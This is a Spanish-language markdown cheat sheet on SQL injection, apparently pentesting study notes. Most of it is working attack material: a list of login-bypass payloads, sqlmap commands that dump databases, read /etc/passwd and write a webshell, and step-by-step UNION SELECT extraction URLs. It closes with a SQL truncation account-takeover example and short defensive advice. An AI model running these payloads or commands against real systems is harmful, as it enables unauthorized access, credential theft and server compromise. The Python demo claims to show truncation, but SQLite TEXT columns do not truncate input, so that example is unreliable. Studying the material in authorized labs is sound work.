# 📚 Guía Básica de Inyección SQL (SQLi) Manual y Automatizada



---

## 📑 Índice

### 1. Introducción
- [❓ ¿Qué es una SQL Injection?](#❓-qué-es-una-sql-injection)
- [📌 ¿Por qué ocurre?](#📌-por-qué-ocurre)

### 2. Conceptos Básicos
- [🔍 Ejemplo sencillo](#🔍-ejemplo-sencillo)
- [🔍 ¿Cómo detectar la vulnerabilidad?](#🔍-cómo-detectar-la-vulnerabilidad)
- [📝 Inyecciones comunes (manuales)](#inyecciones-comunes-manuales)

### 3. Automatización con sqlmap
- [🤖 Automatizar el ataque](#🤖-automatizar-el-ataque)
  - [1️⃣ Buscar bases de datos](#1️⃣-buscar-bases-de-datos)
  - [2️⃣ Enumerar tablas](#2️⃣-enumerar-las-tablas)
  - [3️⃣ Enumerar columnas](#3️⃣-enumerar-las-columnas)
  - [4️⃣ Extraer datos](#4️⃣-extraer-los-datos)
- [🎯 Ataques avanzados con sqlmap](#🎯-ataques-avanzados-con-sqlmap)
  - [🔹 Especificar parámetro vulnerable](#🔹-especificar-el-parámetro-vulnerable)
  - [🔹 Aumentar nivel y riesgo](#🔹-aumentar-el-nivel-y-riesgo-del-ataque)
  - [🔹 Uso de cookies](#🔹-usar-cookies)
  - [🔹 Obtener usuario actual](#🔹-obtener-el-usuario-actual)
  - [🔹 Obtener versión del motor](#🔹-obtener-versión-del-motor)
  - [🔹 Leer archivos](#🔹-leer-archivos)
  - [🔹 Escribir archivos (WebShell)](#🔹-escribir-archivos-webshell)

### 4. Guía de ataque manual (UNION SELECT)
- [🛠️ Paso 1️⃣ Detectar vulnerabilidad](#🛠️-paso-1️⃣-detectar-la-vulnerabilidad)
- [🛠️ Paso 2️⃣ Identificar número de columnas](#🛠️-paso-2️⃣-identificar-el-número-de-columnas)
- [🛠️ Paso 3️⃣ Usar UNION SELECT](#🛠️-paso-3️⃣-usar-union-select)
- [🛠️ Paso 4️⃣ Extraer datos reales](#🛠️-paso-4️⃣-extraer-datos-reales)
- [🛠️ Paso 5️⃣ Listar bases de datos](#🛠️-paso-5️⃣-listar-bases-de-datos)
- [🛠️ Paso 6️⃣ Listar nombres de tablas](#🛠️-paso-6️⃣-listar-nombres-de-tablas)
- [🛠️ Paso 7️⃣ Listar columnas](#🛠️-paso-7️⃣-listar-columnas)
- [🛠️ Paso 8️⃣ Mostrar datos concatenados](#🛠️-paso-8️⃣-mostrar-datos-concatenados)
- [✅ Notas importantes](#✅-notas)

### 5. Ataques específicos
- [🗂️ SQL Truncation Attack](#🗂️-sql-truncation-attack)
  - [¿Qué supone?](#qué-supone)
  - [Ejemplo simple](#ejemplo-simple)
  - [Ejemplo en código (Python + SQLite)](#ejemplo-en-código-python--sqlite-🐍)
  - [Resumen y recomendaciones](#resumen-📝)

---


   

---

## ❓ ¿Qué es una SQL Injection?

Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a la base de datos.

👉 En otras palabras: el atacante logra manipular las consultas a la base de datos para que hagan cosas no deseadas, como:

- obtener datos confidenciales,
- modificar o eliminar datos,
- saltarse controles de autenticación,
- ejecutar comandos administrativos en la base de datos.

---

## 📌 ¿Por qué ocurre?

Sucede cuando una aplicación web **no valida correctamente la entrada del usuario** antes de usarla en una consulta SQL.

---

## 🔍 Ejemplo sencillo

Supongamos que en una página de login tenemos este código en PHP:

```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

Si el atacante, en el campo `password`, escribe:

```sql
' OR '1'='1
```

La consulta que se ejecuta es:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

Como `'1'='1'` siempre es verdadero, es posible que el atacante logre iniciar sesión **sin conocer la contraseña**.

---

## 🔍 ¿Cómo detectar la vulnerabilidad?

Cuando vemos campos a rellenar, intentaremos inyectar código y observaremos la respuesta.  
Lo primero es intentar **escapar del contexto actual** con entradas como:

```
[Nada]
'
"
`
')
")
`)
'))
"))
`))
```

Luego corregimos la consulta.  
Podemos automatizar esta tarea con diccionarios como SecLists.

---

## Inyecciones comunes (manuales)

```sql
" or 1=1
" or 1=1#
" or 1=1--
" or 1=1/*
' or 1=1
' or 1=1#
' or 1=1--
' or 1=1/*
admin" #
admin" --
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin"/*
admin"or 1=1 or ""="
admin' #
admin' --
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin'/*
admin'or 1=1 or ''='
or 1=1
or 1=1#
or 1=1--
or 1=1/*
```

---

## 🤖 Automatizar el ataque

Podemos automatizar el ataque con herramientas como `sqlmap`.

### 1️⃣ Buscar bases de datos

```bash
sqlmap -u http://<IP> --forms --dbs --batch
```

### 2️⃣ Enumerar las tablas

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> --tables --batch
```

### 3️⃣ Enumerar las columnas

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> --columns --batch
```

### 4️⃣ Extraer los datos

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> -C <NOMBRE_DE_LA_COLUMNA_1>,<NOMBRE_DE_LA_COLUMNA_2> --dump --batch
```

---

## 🎯 Ataques avanzados con SQLMap

### 🔹 Especificar el parámetro vulnerable

```bash
sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
```

### 🔹 Aumentar el nivel y riesgo del ataque

```bash
sqlmap -u http://<IP> --forms --dbs --risk=3 --level=5 --batch
```

### 🔹 Usar cookies

```bash
sqlmap -u http://<IP> --cookie="PHPSESSID=XXXXXXXXXXXXX" --dbs --batch
```

### 🔹 Obtener el usuario actual

```bash
sqlmap -u http://<IP> --current-user --batch
```

### 🔹 Obtener versión del motor

```bash
sqlmap -u http://<IP> --banner --batch
```

### 🔹 Leer archivos

```bash
sqlmap -u http://<IP> --file-read="/etc/passwd" --batch
```

### 🔹 Escribir archivos (WebShell)

```bash
sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

---

## 🛠️ Guía de ataque manual (UNION SELECT)

---

## Paso 1️⃣ Detectar la vulnerabilidad

Inserta una comilla simple `'` en un parámetro de entrada (formulario, URL, etc.).

Ejemplo:

```
http://ejemplo.com/product.php?id=1'
```

O prueba con número negativo:

```
http://ejemplo.com/product.php?id=-1
```

---

## Paso 2️⃣ Identificar el número de columnas con ORDER BY

```bash
http://ejemplo.com/product.php?id=1 ORDER BY 1-- -
http://ejemplo.com/product.php?id=1 ORDER BY 2-- -
http://ejemplo.com/product.php?id=1 ORDER BY 3-- -
...
```

Cuando aparezca un error, el número anterior indica la cantidad correcta de columnas.

---

## Paso 3️⃣ Usar UNION SELECT para obtener datos

Ejemplo con 3 columnas:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,2,3-- -
```

Si ves 1, 2, 3 en la página, la inyección funciona.

---

## Paso 4️⃣ Extraer datos reales

Ejemplo:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT username,password,3 FROM users-- -
```

---

## Paso 5️⃣ Listar bases de datos

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata-- -
```

Con LIMIT:

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata LIMIT 0,1-- -
```

---

## Paso 6️⃣ Listar nombres de tablas

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
```

---

## Paso 7️⃣ Listar columnas

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
```

---

## Paso 8️⃣ Mostrar datos concatenados

```bash
http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUMNA2>),3,4,5 FROM <NOMBRE_BASE_DATOS>.<NOMBRE_TABLA>-- -
```

(0x3a representa el carácter ":")

---

## ✅ Notas

- Adaptar el número de columnas a las de la consulta original.
- Usar `-- -` o `#` para comentar el resto de la consulta original.
- Probar siempre en entornos de prueba autorizados.

---


## 🗂️ SQL Truncation Attack 

El **SQL truncation** es una técnica que explota cómo algunas bases de datos o aplicaciones manejan cadenas de texto más largas de lo permitido por el esquema de la base de datos.

### ¿Qué supone esto?

Supongamos que tenemos un panel de registro y conocemos un usuario administrador, por ejemplo:

```
admin
```

Vamos a intentar registrar un usuario así:

```
admin                               lala
```

Aquí viene el truco: si el campo `username` es `VARCHAR(8)` (es decir, máximo 8 caracteres), ocurre lo siguiente:

- Algunas bases de datos lo **recortan** automáticamente (truncamiento).
- Otras bases de datos dan **error**.

Si la aplicación no controla esto bien, puede causar:

- Fallos de autenticación.
- Saltarse restricciones de `UNIQUE`.
- Confusión en los registros.

👉 En este caso, la aplicación acaba **sobrescribiendo** al usuario `admin` con nuestra contraseña. Luego, tendremos acceso como el admin legítimo.

---

## Ejemplo simple 📋

### Tabla de usuarios:

```sql
CREATE TABLE users (
    username VARCHAR(8) UNIQUE,
    password VARCHAR(100)
);
```

### 1️⃣ Usuario legítimo:

```sql
INSERT INTO users (username, password)
VALUES ('admin', 'securepass');
```

### 2️⃣ Atacante intenta crear:

```sql
INSERT INTO users (username, password)
VALUES ('admin             lala', 'hackedpass');
```

### Resultado:

- `'admin             lala'` se **trunca** a `'admin'`.
- Si `'admin'` no existía, se guarda.
- Si `'admin'` ya existía, puede:
  - Dar un **error** (violación de `UNIQUE`), o
  - **Sobrescribir** al usuario `admin`, dependiendo de cómo esté implementada la lógica de inserción (por ejemplo, si se hace `INSERT OR REPLACE` o `ON DUPLICATE KEY UPDATE`).

---

## Ejemplo en código (Python + SQLite) 🐍

```python
import sqlite3

# Crear la base de datos en memoria
conn = sqlite3.connect(":memory:")
c = conn.cursor()

# Crear la tabla
c.execute("""
CREATE TABLE users (
    username TEXT UNIQUE,
    password TEXT
)
""")

# Insertar usuario legítimo
c.execute("INSERT INTO users (username, password) VALUES (?, ?)", ("admin", "securepass"))

# Intento de ataque con truncamiento
try:
    c.execute("INSERT INTO users (username, password) VALUES (?, ?)", ("admin           lala", "hackedpass"))
except sqlite3.IntegrityError as e:
    print("IntegrityError:", e)

# Ver los usuarios
for row in c.execute("SELECT username, password FROM users"):
    print(row)

conn.close()
```

---

## Resumen 📝

- SQL truncation es un ataque muy sencillo pero efectivo si el tamaño de los campos no está bien validado.
- Permite, en ciertos casos, **tomar control** de cuentas ya existentes.
- Es importante:
  - Validar el tamaño del campo en la aplicación.
  - No confiar únicamente en la base de datos.
  - Normalizar (trim, pad) los datos de entrada y de consulta.

---










